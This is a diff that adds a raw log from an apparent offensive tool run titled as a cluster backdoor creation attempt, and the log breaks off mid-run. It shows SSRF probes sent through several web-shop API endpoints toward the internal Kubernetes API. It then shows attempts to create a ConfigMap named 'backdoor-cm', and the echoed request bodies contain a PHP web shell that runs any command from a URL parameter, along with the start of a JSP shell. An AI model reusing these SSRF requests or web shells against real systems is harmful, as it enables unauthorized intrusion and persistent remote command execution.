@@ -1,0 +1,1251 @@
+[2025-12-10 17:50:19] [INFO] Starting cluster backdoor creation attempt...
+[2025-12-10 17:50:19] [INFO] Logging in...
+[2025-12-10 17:50:39] [SUCCESS] Login successful
+[2025-12-10 17:50:39] [INFO] 
+======================================================================
+[2025-12-10 17:50:39] [INFO] ШАГ 1: Получение доступа к Kubernetes API через SSRF
+[2025-12-10 17:50:39] [INFO] ======================================================================
+[2025-12-10 17:50:39] [INFO] Testing SSRF: /semiprotected/api/checkout/state-api/v2/get -> https://kubernetes.default.svc
+[2025-12-10 17:50:42] [INFO]   Response status: 405
+[2025-12-10 17:50:42] [INFO]   Response preview: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#...
+[2025-12-10 17:50:42] [INFO] Testing SSRF: /semiprotected/api/checkout/state-api/v2/get -> https://kubernetes.default.svc:443
+[2025-12-10 17:50:43] [INFO]   Response status: 405
+[2025-12-10 17:50:43] [INFO]   Response preview: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#...
+[2025-12-10 17:50:43] [INFO] Testing SSRF: /semiprotected/api/checkout/state-api/v2/get -> https://10.96.0.1
+[2025-12-10 17:50:45] [INFO]   Response status: 405
+[2025-12-10 17:50:45] [INFO]   Response preview: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#...
+[2025-12-10 17:50:45] [INFO] Testing SSRF: /semiprotected/api/checkout/state-api/v2/get -> http://kubernetes.default.svc
+[2025-12-10 17:50:46] [INFO]   Response status: 405
+[2025-12-10 17:50:46] [INFO]   Response preview: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#...
+[2025-12-10 17:50:46] [INFO] Testing SSRF: /semiprotected/api/checkout/state-api/v2/get -> http://127.0.0.1:6443
+[2025-12-10 17:50:47] [INFO]   Response status: 405
+[2025-12-10 17:50:47] [INFO]   Response preview: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#...
+[2025-12-10 17:50:47] [INFO] Testing SSRF: /semiprotected/api/checkout/state-api/v2/get -> http://localhost:6443
+[2025-12-10 17:50:49] [INFO]   Response status: 405
+[2025-12-10 17:50:49] [INFO]   Response preview: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#...
+[2025-12-10 17:50:49] [INFO] Testing SSRF: /semiprotected/api/checkout/state-api/v2/get -> https://kubernetes.default.svc/api
+[2025-12-10 17:50:50] [INFO]   Response status: 405
+[2025-12-10 17:50:50] [INFO]   Response preview: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#...
+[2025-12-10 17:50:50] [INFO] Testing SSRF: /semiprotected/api/checkout/state-api/v2/get -> https://kubernetes.default.svc/api/v1
+[2025-12-10 17:50:52] [INFO]   Response status: 405
+[2025-12-10 17:50:52] [INFO]   Response preview: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#...
+[2025-12-10 17:50:52] [INFO] Testing SSRF: /semiprotected/api/checkout/state-api/v2/get -> https://kubernetes.default.svc/api/v1/namespaces
+[2025-12-10 17:50:53] [INFO]   Response status: 405
+[2025-12-10 17:50:53] [INFO]   Response preview: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#...
+[2025-12-10 17:50:53] [INFO] Testing SSRF: /semiprotected/api/checkout/state-api/v2/get -> https://kubernetes.default.svc/api/v1/namespaces/default
+[2025-12-10 17:50:54] [INFO]   Response status: 405
+[2025-12-10 17:50:54] [INFO]   Response preview: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#...
+[2025-12-10 17:50:54] [INFO] Testing SSRF: /zootopia-events/api/events/sites/1 -> https://kubernetes.default.svc
+[2025-12-10 17:50:55] [INFO]   Response status: 200
+[2025-12-10 17:50:55] [INFO]   Response preview: {}...
+[2025-12-10 17:50:55] [INFO] Testing SSRF: /zootopia-events/api/events/sites/1 -> https://kubernetes.default.svc:443
+[2025-12-10 17:50:56] [INFO]   Response status: 200
+[2025-12-10 17:50:56] [INFO]   Response preview: {}...
+[2025-12-10 17:50:56] [INFO] Testing SSRF: /zootopia-events/api/events/sites/1 -> https://10.96.0.1
+[2025-12-10 17:50:57] [INFO]   Response status: 200
+[2025-12-10 17:50:57] [INFO]   Response preview: {}...
+[2025-12-10 17:50:57] [INFO] Testing SSRF: /zootopia-events/api/events/sites/1 -> http://kubernetes.default.svc
+[2025-12-10 17:50:58] [INFO]   Response status: 200
+[2025-12-10 17:50:58] [INFO]   Response preview: {}...
+[2025-12-10 17:50:58] [INFO] Testing SSRF: /zootopia-events/api/events/sites/1 -> http://127.0.0.1:6443
+[2025-12-10 17:50:59] [INFO]   Response status: 200
+[2025-12-10 17:50:59] [INFO]   Response preview: {}...
+[2025-12-10 17:50:59] [INFO] Testing SSRF: /zootopia-events/api/events/sites/1 -> http://localhost:6443
+[2025-12-10 17:51:00] [INFO]   Response status: 200
+[2025-12-10 17:51:00] [INFO]   Response preview: {}...
+[2025-12-10 17:51:00] [INFO] Testing SSRF: /zootopia-events/api/events/sites/1 -> https://kubernetes.default.svc/api
+[2025-12-10 17:51:01] [INFO]   Response status: 200
+[2025-12-10 17:51:01] [INFO]   Response preview: {}...
+[2025-12-10 17:51:01] [INFO] Testing SSRF: /zootopia-events/api/events/sites/1 -> https://kubernetes.default.svc/api/v1
+[2025-12-10 17:51:02] [INFO]   Response status: 200
+[2025-12-10 17:51:02] [INFO]   Response preview: {}...
+[2025-12-10 17:51:02] [INFO] Testing SSRF: /zootopia-events/api/events/sites/1 -> https://kubernetes.default.svc/api/v1/namespaces
+[2025-12-10 17:51:02] [INFO]   Response status: 200
+[2025-12-10 17:51:02] [INFO]   Response preview: {}...
+[2025-12-10 17:51:02] [INFO] Testing SSRF: /zootopia-events/api/events/sites/1 -> https://kubernetes.default.svc/api/v1/namespaces/default
+[2025-12-10 17:51:03] [INFO]   Response status: 200
+[2025-12-10 17:51:03] [INFO]   Response preview: {}...
+[2025-12-10 17:51:03] [INFO] Testing SSRF: /leto-personalization/api/v1/personalization/events/sites/1 -> https://kubernetes.default.svc
+[2025-12-10 17:51:04] [INFO]   Response status: 422
+[2025-12-10 17:51:04] [INFO]   Response preview: {"errors":[{"type":"missing","loc":["body","events"],"msg":"Field required","input":{"url":"https://kubernetes.default.svc","method":"GET"}}]}...
+[2025-12-10 17:51:04] [INFO] Testing SSRF: /leto-personalization/api/v1/personalization/events/sites/1 -> https://kubernetes.default.svc:443
+[2025-12-10 17:51:05] [INFO]   Response status: 422
+[2025-12-10 17:51:05] [INFO]   Response preview: {"errors":[{"type":"missing","loc":["body","events"],"msg":"Field required","input":{"url":"https://kubernetes.default.svc:443","method":"GET"}}]}...
+[2025-12-10 17:51:05] [INFO] Testing SSRF: /leto-personalization/api/v1/personalization/events/sites/1 -> https://10.96.0.1
+[2025-12-10 17:51:06] [INFO]   Response status: 422
+[2025-12-10 17:51:06] [INFO]   Response preview: {"errors":[{"type":"missing","loc":["body","events"],"msg":"Field required","input":{"url":"https://10.96.0.1","method":"GET"}}]}...
+[2025-12-10 17:51:06] [INFO] Testing SSRF: /leto-personalization/api/v1/personalization/events/sites/1 -> http://kubernetes.default.svc
+[2025-12-10 17:51:07] [INFO]   Response status: 422
+[2025-12-10 17:51:07] [INFO]   Response preview: {"errors":[{"type":"missing","loc":["body","events"],"msg":"Field required","input":{"url":"http://kubernetes.default.svc","method":"GET"}}]}...
+[2025-12-10 17:51:07] [INFO] Testing SSRF: /leto-personalization/api/v1/personalization/events/sites/1 -> http://127.0.0.1:6443
+[2025-12-10 17:51:08] [INFO]   Response status: 422
+[2025-12-10 17:51:08] [INFO]   Response preview: {"errors":[{"type":"missing","loc":["body","events"],"msg":"Field required","input":{"url":"http://127.0.0.1:6443","method":"GET"}}]}...
+[2025-12-10 17:51:08] [INFO] Testing SSRF: /leto-personalization/api/v1/personalization/events/sites/1 -> http://localhost:6443
+[2025-12-10 17:51:09] [INFO]   Response status: 422
+[2025-12-10 17:51:09] [INFO]   Response preview: {"errors":[{"type":"missing","loc":["body","events"],"msg":"Field required","input":{"url":"http://localhost:6443","method":"GET"}}]}...
+[2025-12-10 17:51:09] [INFO] Testing SSRF: /leto-personalization/api/v1/personalization/events/sites/1 -> https://kubernetes.default.svc/api
+[2025-12-10 17:51:10] [INFO]   Response status: 422
+[2025-12-10 17:51:10] [INFO]   Response preview: {"errors":[{"type":"missing","loc":["body","events"],"msg":"Field required","input":{"url":"https://kubernetes.default.svc/api","method":"GET"}}]}...
+[2025-12-10 17:51:10] [INFO] Testing SSRF: /leto-personalization/api/v1/personalization/events/sites/1 -> https://kubernetes.default.svc/api/v1
+[2025-12-10 17:51:10] [INFO]   Response status: 422
+[2025-12-10 17:51:10] [INFO]   Response preview: {"errors":[{"type":"missing","loc":["body","events"],"msg":"Field required","input":{"url":"https://kubernetes.default.svc/api/v1","method":"GET"}}]}...
+[2025-12-10 17:51:10] [INFO] Testing SSRF: /leto-personalization/api/v1/personalization/events/sites/1 -> https://kubernetes.default.svc/api/v1/namespaces
+[2025-12-10 17:51:11] [INFO]   Response status: 422
+[2025-12-10 17:51:11] [INFO]   Response preview: {"errors":[{"type":"missing","loc":["body","events"],"msg":"Field required","input":{"url":"https://kubernetes.default.svc/api/v1/namespaces","method":"GET"}}]}...
+[2025-12-10 17:51:11] [INFO] Testing SSRF: /leto-personalization/api/v1/personalization/events/sites/1 -> https://kubernetes.default.svc/api/v1/namespaces/default
+[2025-12-10 17:51:12] [INFO]   Response status: 422
+[2025-12-10 17:51:12] [INFO]   Response preview: {"errors":[{"type":"missing","loc":["body","events"],"msg":"Field required","input":{"url":"https://kubernetes.default.svc/api/v1/namespaces/default","method":"GET"}}]}...
+[2025-12-10 17:51:12] [INFO] Testing SSRF: /myaccount/api/order-details/v3/feature-flags -> https://kubernetes.default.svc
+[2025-12-10 17:51:13] [INFO]   Response status: 401
+[2025-12-10 17:51:13] [INFO]   Response preview: ...
+[2025-12-10 17:51:13] [INFO] Testing SSRF: /myaccount/api/order-details/v3/feature-flags -> https://kubernetes.default.svc:443
+[2025-12-10 17:51:14] [INFO]   Response status: 401
+[2025-12-10 17:51:14] [INFO]   Response preview: ...
+[2025-12-10 17:51:14] [INFO] Testing SSRF: /myaccount/api/order-details/v3/feature-flags -> https://10.96.0.1
+[2025-12-10 17:51:14] [INFO]   Response status: 401
+[2025-12-10 17:51:14] [INFO]   Response preview: ...
+[2025-12-10 17:51:14] [INFO] Testing SSRF: /myaccount/api/order-details/v3/feature-flags -> http://kubernetes.default.svc
+[2025-12-10 17:51:15] [INFO]   Response status: 401
+[2025-12-10 17:51:15] [INFO]   Response preview: ...
+[2025-12-10 17:51:15] [INFO] Testing SSRF: /myaccount/api/order-details/v3/feature-flags -> http://127.0.0.1:6443
+[2025-12-10 17:51:16] [INFO]   Response status: 401
+[2025-12-10 17:51:16] [INFO]   Response preview: ...
+[2025-12-10 17:51:16] [INFO] Testing SSRF: /myaccount/api/order-details/v3/feature-flags -> http://localhost:6443
+[2025-12-10 17:51:17] [INFO]   Response status: 401
+[2025-12-10 17:51:17] [INFO]   Response preview: ...
+[2025-12-10 17:51:17] [INFO] Testing SSRF: /myaccount/api/order-details/v3/feature-flags -> https://kubernetes.default.svc/api
+[2025-12-10 17:51:18] [INFO]   Response status: 401
+[2025-12-10 17:51:18] [INFO]   Response preview: ...
+[2025-12-10 17:51:18] [INFO] Testing SSRF: /myaccount/api/order-details/v3/feature-flags -> https://kubernetes.default.svc/api/v1
+[2025-12-10 17:51:19] [INFO]   Response status: 401
+[2025-12-10 17:51:19] [INFO]   Response preview: ...
+[2025-12-10 17:51:19] [INFO] Testing SSRF: /myaccount/api/order-details/v3/feature-flags -> https://kubernetes.default.svc/api/v1/namespaces
+[2025-12-10 17:51:19] [INFO]   Response status: 401
+[2025-12-10 17:51:19] [INFO]   Response preview: ...
+[2025-12-10 17:51:19] [INFO] Testing SSRF: /myaccount/api/order-details/v3/feature-flags -> https://kubernetes.default.svc/api/v1/namespaces/default
+[2025-12-10 17:51:20] [INFO]   Response status: 401
+[2025-12-10 17:51:20] [INFO]   Response preview: ...
+[2025-12-10 17:51:20] [INFO] 
+======================================================================
+[2025-12-10 17:51:20] [INFO] ШАГ 2: Создание ConfigMap с бекдором
+[2025-12-10 17:51:20] [INFO] ======================================================================
+[2025-12-10 17:51:20] [INFO] Creating ConfigMap via: /semiprotected/api/checkout/state-api/v2/get -> https://kubernetes.default.svc/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:21] [INFO]   Response status: 405
+[2025-12-10 17:51:21] [INFO]   Response: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>...
+[2025-12-10 17:51:21] [INFO] Creating ConfigMap via: /semiprotected/api/checkout/state-api/v2/get -> https://kubernetes.default.svc:443/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:23] [INFO]   Response status: 405
+[2025-12-10 17:51:23] [INFO]   Response: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>...
+[2025-12-10 17:51:23] [INFO] Creating ConfigMap via: /semiprotected/api/checkout/state-api/v2/get -> https://10.96.0.1/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:24] [INFO]   Response status: 405
+[2025-12-10 17:51:24] [INFO]   Response: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>...
+[2025-12-10 17:51:24] [INFO] Creating ConfigMap via: /semiprotected/api/checkout/state-api/v2/get -> http://kubernetes.default.svc/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:26] [INFO]   Response status: 405
+[2025-12-10 17:51:26] [INFO]   Response: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>...
+[2025-12-10 17:51:26] [INFO] Creating ConfigMap via: /semiprotected/api/checkout/state-api/v2/get -> http://127.0.0.1:6443/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:27] [INFO]   Response status: 405
+[2025-12-10 17:51:27] [INFO]   Response: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>...
+[2025-12-10 17:51:27] [INFO] Creating ConfigMap via: /semiprotected/api/checkout/state-api/v2/get -> http://localhost:6443/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:28] [INFO]   Response status: 405
+[2025-12-10 17:51:28] [INFO]   Response: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>...
+[2025-12-10 17:51:28] [INFO] Creating ConfigMap via: /semiprotected/api/checkout/state-api/v2/get -> https://kubernetes.default.svc/api/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:30] [INFO]   Response status: 405
+[2025-12-10 17:51:30] [INFO]   Response: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>...
+[2025-12-10 17:51:30] [INFO] Creating ConfigMap via: /semiprotected/api/checkout/state-api/v2/get -> https://kubernetes.default.svc/api/v1/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:31] [INFO]   Response status: 405
+[2025-12-10 17:51:31] [INFO]   Response: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>...
+[2025-12-10 17:51:31] [INFO] Creating ConfigMap via: /semiprotected/api/checkout/state-api/v2/get -> https://kubernetes.default.svc/api/v1/namespaces/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:33] [INFO]   Response status: 405
+[2025-12-10 17:51:33] [INFO]   Response: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>...
+[2025-12-10 17:51:33] [INFO] Creating ConfigMap via: /semiprotected/api/checkout/state-api/v2/get -> https://kubernetes.default.svc/api/v1/namespaces/default/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:34] [INFO]   Response status: 405
+[2025-12-10 17:51:34] [INFO]   Response: <!doctype html><html lang="en"><head><title>HTTP Status 405 – Method Not Allowed</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 405 – Method Not Allowed</h1></body></html>...
+[2025-12-10 17:51:34] [INFO] Creating ConfigMap via: /zootopia-events/api/events/sites/1 -> https://kubernetes.default.svc/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:35] [INFO]   Response status: 200
+[2025-12-10 17:51:35] [INFO]   Response: {}...
+[2025-12-10 17:51:35] [INFO] Creating ConfigMap via: /zootopia-events/api/events/sites/1 -> https://kubernetes.default.svc:443/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:35] [INFO]   Response status: 200
+[2025-12-10 17:51:35] [INFO]   Response: {}...
+[2025-12-10 17:51:35] [INFO] Creating ConfigMap via: /zootopia-events/api/events/sites/1 -> https://10.96.0.1/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:36] [INFO]   Response status: 200
+[2025-12-10 17:51:36] [INFO]   Response: {}...
+[2025-12-10 17:51:36] [INFO] Creating ConfigMap via: /zootopia-events/api/events/sites/1 -> http://kubernetes.default.svc/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:37] [INFO]   Response status: 200
+[2025-12-10 17:51:37] [INFO]   Response: {}...
+[2025-12-10 17:51:37] [INFO] Creating ConfigMap via: /zootopia-events/api/events/sites/1 -> http://127.0.0.1:6443/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:38] [INFO]   Response status: 200
+[2025-12-10 17:51:38] [INFO]   Response: {}...
+[2025-12-10 17:51:38] [INFO] Creating ConfigMap via: /zootopia-events/api/events/sites/1 -> http://localhost:6443/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:38] [INFO]   Response status: 200
+[2025-12-10 17:51:38] [INFO]   Response: {}...
+[2025-12-10 17:51:38] [INFO] Creating ConfigMap via: /zootopia-events/api/events/sites/1 -> https://kubernetes.default.svc/api/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:39] [INFO]   Response status: 200
+[2025-12-10 17:51:39] [INFO]   Response: {}...
+[2025-12-10 17:51:39] [INFO] Creating ConfigMap via: /zootopia-events/api/events/sites/1 -> https://kubernetes.default.svc/api/v1/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:40] [INFO]   Response status: 200
+[2025-12-10 17:51:40] [INFO]   Response: {}...
+[2025-12-10 17:51:40] [INFO] Creating ConfigMap via: /zootopia-events/api/events/sites/1 -> https://kubernetes.default.svc/api/v1/namespaces/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:41] [INFO]   Response status: 200
+[2025-12-10 17:51:41] [INFO]   Response: {}...
+[2025-12-10 17:51:41] [INFO] Creating ConfigMap via: /zootopia-events/api/events/sites/1 -> https://kubernetes.default.svc/api/v1/namespaces/default/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:41] [INFO]   Response status: 200
+[2025-12-10 17:51:41] [INFO]   Response: {}...
+[2025-12-10 17:51:41] [INFO] Creating ConfigMap via: /leto-personalization/api/v1/personalization/events/sites/1 -> https://kubernetes.default.svc/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:42] [INFO]   Response status: 422
+[2025-12-10 17:51:42] [INFO]   Response: {"errors":[{"type":"missing","loc":["body","events"],"msg":"Field required","input":{"url":"https://kubernetes.default.svc/api/v1/namespaces/default/configmaps","method":"POST","body":"{\"apiVersion\": \"v1\", \"kind\": \"ConfigMap\", \"metadata\": {\"name\": \"backdoor-cm\", \"namespace\": \"default\"}, \"data\": {\"shell.php\": \"<?php if(isset($_GET[\\\"cmd\\\"])){system($_GET[\\\"cmd\\\"]);} ?>\", \"shell.jsp\": \"<%@ page import=\\\"java.util.*,java.io.*\\\"%><% if (request.getParameter(\\\...
+[2025-12-10 17:51:42] [INFO] Creating ConfigMap via: /leto-personalization/api/v1/personalization/events/sites/1 -> https://kubernetes.default.svc:443/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:43] [INFO]   Response status: 422
+[2025-12-10 17:51:43] [INFO]   Response: {"errors":[{"type":"missing","loc":["body","events"],"msg":"Field required","input":{"url":"https://kubernetes.default.svc:443/api/v1/namespaces/default/configmaps","method":"POST","body":"{\"apiVersion\": \"v1\", \"kind\": \"ConfigMap\", \"metadata\": {\"name\": \"backdoor-cm\", \"namespace\": \"default\"}, \"data\": {\"shell.php\": \"<?php if(isset($_GET[\\\"cmd\\\"])){system($_GET[\\\"cmd\\\"]);} ?>\", \"shell.jsp\": \"<%@ page import=\\\"java.util.*,java.io.*\\\"%><% if (request.getParameter...
+[2025-12-10 17:51:43] [INFO] Creating ConfigMap via: /leto-personalization/api/v1/personalization/events/sites/1 -> https://10.96.0.1/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:44] [INFO]   Response status: 422
+[2025-12-10 17:51:44] [INFO]   Response: {"errors":[{"type":"missing","loc":["body","events"],"msg":"Field required","input":{"url":"https://10.96.0.1/api/v1/namespaces/default/configmaps","method":"POST","body":"{\"apiVersion\": \"v1\", \"kind\": \"ConfigMap\", \"metadata\": {\"name\": \"backdoor-cm\", \"namespace\": \"default\"}, \"data\": {\"shell.php\": \"<?php if(isset($_GET[\\\"cmd\\\"])){system($_GET[\\\"cmd\\\"]);} ?>\", \"shell.jsp\": \"<%@ page import=\\\"java.util.*,java.io.*\\\"%><% if (request.getParameter(\\\"cmd\\\") != ...
+[2025-12-10 17:51:44] [INFO] Creating ConfigMap via: /leto-personalization/api/v1/personalization/events/sites/1 -> http://kubernetes.default.svc/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:45] [INFO]   Response status: 422
+[2025-12-10 17:51:45] [INFO]   Response: {"errors":[{"type":"missing","loc":["body","events"],"msg":"Field required","input":{"url":"http://kubernetes.default.svc/api/v1/namespaces/default/configmaps","method":"POST","body":"{\"apiVersion\": \"v1\", \"kind\": \"ConfigMap\", \"metadata\": {\"name\": \"backdoor-cm\", \"namespace\": \"default\"}, \"data\": {\"shell.php\": \"<?php if(isset($_GET[\\\"cmd\\\"])){system($_GET[\\\"cmd\\\"]);} ?>\", \"shell.jsp\": \"<%@ page import=\\\"java.util.*,java.io.*\\\"%><% if (request.getParameter(\\\"...
+[2025-12-10 17:51:45] [INFO] Creating ConfigMap via: /leto-personalization/api/v1/personalization/events/sites/1 -> http://127.0.0.1:6443/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:45] [INFO]   Response status: 422
+[2025-12-10 17:51:45] [INFO]   Response: {"errors":[{"type":"missing","loc":["body","events"],"msg":"Field required","input":{"url":"http://127.0.0.1:6443/api/v1/namespaces/default/configmaps","method":"POST","body":"{\"apiVersion\": \"v1\", \"kind\": \"ConfigMap\", \"metadata\": {\"name\": \"backdoor-cm\", \"namespace\": \"default\"}, \"data\": {\"shell.php\": \"<?php if(isset($_GET[\\\"cmd\\\"])){system($_GET[\\\"cmd\\\"]);} ?>\", \"shell.jsp\": \"<%@ page import=\\\"java.util.*,java.io.*\\\"%><% if (request.getParameter(\\\"cmd\\\")...
+[2025-12-10 17:51:45] [INFO] Creating ConfigMap via: /leto-personalization/api/v1/personalization/events/sites/1 -> http://localhost:6443/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:46] [INFO]   Response status: 422
+[2025-12-10 17:51:46] [INFO]   Response: {"errors":[{"type":"missing","loc":["body","events"],"msg":"Field required","input":{"url":"http://localhost:6443/api/v1/namespaces/default/configmaps","method":"POST","body":"{\"apiVersion\": \"v1\", \"kind\": \"ConfigMap\", \"metadata\": {\"name\": \"backdoor-cm\", \"namespace\": \"default\"}, \"data\": {\"shell.php\": \"<?php if(isset($_GET[\\\"cmd\\\"])){system($_GET[\\\"cmd\\\"]);} ?>\", \"shell.jsp\": \"<%@ page import=\\\"java.util.*,java.io.*\\\"%><% if (request.getParameter(\\\"cmd\\\")...
+[2025-12-10 17:51:46] [INFO] Creating ConfigMap via: /leto-personalization/api/v1/personalization/events/sites/1 -> https://kubernetes.default.svc/api/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:47] [INFO]   Response status: 422
+[2025-12-10 17:51:47] [INFO]   Response: {"errors":[{"type":"missing","loc":["body","events"],"msg":"Field required","input":{"url":"https://kubernetes.default.svc/api/api/v1/namespaces/default/configmaps","method":"POST","body":"{\"apiVersion\": \"v1\", \"kind\": \"ConfigMap\", \"metadata\": {\"name\": \"backdoor-cm\", \"namespace\": \"default\"}, \"data\": {\"shell.php\": \"<?php if(isset($_GET[\\\"cmd\\\"])){system($_GET[\\\"cmd\\\"]);} ?>\", \"shell.jsp\": \"<%@ page import=\\\"java.util.*,java.io.*\\\"%><% if (request.getParameter...
+[2025-12-10 17:51:47] [INFO] Creating ConfigMap via: /leto-personalization/api/v1/personalization/events/sites/1 -> https://kubernetes.default.svc/api/v1/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:48] [INFO]   Response status: 422
+[2025-12-10 17:51:48] [INFO]   Response: {"errors":[{"type":"missing","loc":["body","events"],"msg":"Field required","input":{"url":"https://kubernetes.default.svc/api/v1/api/v1/namespaces/default/configmaps","method":"POST","body":"{\"apiVersion\": \"v1\", \"kind\": \"ConfigMap\", \"metadata\": {\"name\": \"backdoor-cm\", \"namespace\": \"default\"}, \"data\": {\"shell.php\": \"<?php if(isset($_GET[\\\"cmd\\\"])){system($_GET[\\\"cmd\\\"]);} ?>\", \"shell.jsp\": \"<%@ page import=\\\"java.util.*,java.io.*\\\"%><% if (request.getParame...
+[2025-12-10 17:51:48] [INFO] Creating ConfigMap via: /leto-personalization/api/v1/personalization/events/sites/1 -> https://kubernetes.default.svc/api/v1/namespaces/api/v1/namespaces/default/configmaps
+[2025-12-10 17:51:48] [INFO]   Response status: 422
